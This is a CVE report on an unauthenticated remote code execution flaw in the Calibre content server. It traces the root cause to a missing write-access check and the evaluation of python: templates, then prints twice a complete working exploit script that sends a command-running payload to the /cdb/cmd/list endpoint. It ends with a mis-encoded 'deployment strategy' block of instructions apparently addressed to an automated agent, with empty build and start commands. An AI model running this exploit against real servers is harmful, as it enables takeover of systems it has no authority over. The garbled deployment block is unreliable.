"# CVE Report: CVE-2024-6782\n\n## Summary\nCVE-2024-6782 is a critical vulnerability identified in Calibre versions 6.9.0 through 7.14.0, which allows unauthenticated attackers to achieve remote code execution through improper access control mechanisms. The vulnerability is classified under CWE-863, indicating incorrect authorization, which permits unauthorized users to execute arbitrary code on the server.\n\n## Root Cause of the Vulnerability\nThe root cause of the vulnerability lies in the way Calibre's content server handles incoming HTTP requests. Specifically, the vulnerability is found in the `cmd_list.py` file, which is invoked by the `cdb.py` router. When a request is made to the `/cdb/cmd/list` endpoint, the server imports the `cmd_list.py` module and executes its `implementation()` function, passing user-controlled arguments directly from the request body.\n\nThe critical flaw occurs because the `readonly` variable in `cmd_list.py` is set to `True`, but the check for write access is bypassed if the module does not explicitly set `readonly` to `False`. This allows the execution of the `implementation()` function with user-controlled arguments, including a template string that can be crafted to execute arbitrary Python code.\n\nThe `implementation()` function processes the user-supplied template using the `SafeFormat` class, which evaluates the template string without proper input sanitization. If the template string starts with `python:`, it allows for arbitrary code execution, leading to the vulnerability.\n\n### Code Analysis\nThe following code snippets illustrate the vulnerability:\n\n1. **Router Code** (cdb.py):\n   ```python\n   if not getattr(m, 'readonly', False): # [1]\n       ctx.check_for_write_access(rd)\n   ```\n\n2. **Vulnerable Function** (cmd_list.py):\n   ```python\n   def implementation(\n       db, notify_changes, fields, sort_by, ascending, search_text, limit, template=None\n   ):\n       if field == 'template':\n           vals = {}\n           global_vars = {}\n           if formatter is None:\n               from calibre.ebooks.metadata.book.formatter import SafeFormat\n               formatter = SafeFormat()\n           for book_id in book_ids:\n               mi = db.get_proxy_metadata(book_id)\n               vals[book_id] = formatter.safe_format(template, {}, 'TEMPLATE ERROR', mi, global_vars=global_vars)\n   ```\n\n3. **Template Evaluation** (formatter.py):\n   ```python\n   def evaluate(self, fmt, args, kwargs, global_vars, break_reporter=None):\n       if fmt.startswith('python:'):\n           ans = self._eval_python_template(fmt[7:], self.column_name)\n   ```\n\n## Exploit Details\nTo exploit this vulnerability, an attacker can send a specially crafted POST request to the `/cdb/cmd/list` endpoint of the Calibre content server. The attacker can include a payload in the `template` field that executes arbitrary commands on the server.\n\n### Example Exploit Overview\nAn example exploit script is provided in the advisory, which demonstrates how to execute a command (e.g., `whoami`) on the server:\n\n```python\nimport json\nimport requests\n\n_target = \"http://localhost:8080\"\n\ndef exploit(cmd):\n    r = requests.post(\n        f\"{_target}/cdb/cmd/list\",\n        headers={\"Content-Type\": \"application/json\"},\n        json=[\n            [\"template\"],\n            \"\", # sortby: leave empty\n            \"\", # ascending: leave empty\n            \"\", # search_text: leave empty, set to all\n            1, # limit results\n            f\"python:def evaluate(a, b):\\n import subprocess\\n try:\\n return subprocess.check_output(['cmd.exe', '/c', '{cmd}']).decode()\\n except Exception:\\n return subprocess.check_output(['sh', '-c', '{cmd}']).decode()\", # payload\n        ],\n    )\n\n    try:\n        print(list(r.json()[\"result\"][\"data\"][\"template\"].values())[0])\n    except Exception as e:\n        print(r.text)\n\nif __name__ == \"__main__\":\n    exploit(\"whoami\")\n```\n\n## Environment Setup Requirements\n- Port: 8080\n- Target Endpoint: /cdb/cmd/list\n- Explicit Configuration: None mentioned in the advisory.\n\n## Complete PoC Code\n```python\n#! /usr/bin/env python3\n# PoC for: CVE-2024-6782\n# Description: Unauthenticated remote code execution in calibre <= 7.14.0\n# Written by: Amos Ng (@LFlare)\nimport json\nimport sys\n\nimport requests\n\n_target = \"http://localhost:8080\"\n\ndef exploit(cmd):\n    r = requests.post(\n        f\"{_target}/cdb/cmd/list\",\n        headers={\"Content-Type\": \"application/json\"},\n        json=[\n            [\"template\"],\n            \"\", # sortby: leave empty\n            \"\", # ascending: leave empty\n            \"\", # search_text: leave empty, set to all\n            1, # limit results\n            f\"python:def evaluate(a, b):\\n import subprocess\\n try:\\n return subprocess.check_output(['cmd.exe', '/c', '{cmd}']).decode()\\n except Exception:\\n return subprocess.check_output(['sh', '-c', '{cmd}']).decode()\", # payload\n        ],\n    )\n\n    try:\n        print(list(r.json()[\"result\"][\"data\"][\"template\"].values())[0])\n    except Exception as e:\n        print(r.text)\n\nif __name__ == \"__main__\":\n    exploit(\"whoami\")\n```\n\nThis report outlines the critical vulnerability in Calibre, its root cause, and the steps necessary to exploit it, along with the proof-of-concept code for demonstration purposes.\n\n## ðŸš€ DEPLOYMENT STRATEGY (USE THIS - DO NOT GUESS!)\n\n**Repository URL**: https://github.com/kovidgoyal/calibre\n**Platform**: N/A\n**Language**: None\n**Build Tool**: None\n\n### Build Commands:\n```bash\n\n```\n\n### Start Commands:\n```bash\n\n```\n\n### Deployment Notes:\nä»Ž GitHub æºç éƒ¨ç½²ã€‚è¯­è¨€: æœªçŸ¥, æž„å»ºå·¥å…·: æœªçŸ¥\n\nâš ï¸ **CRITICAL INSTRUCTIONS**:\n1. DO NOT try to find Docker images or guess repository URLs\n2. USE THE REPOSITORY URL PROVIDED ABOVE\n3. Clone from the specified repository and follow build/start commands\n4. If build commands fail, analyze error and adapt (but keep using the same repo)\n"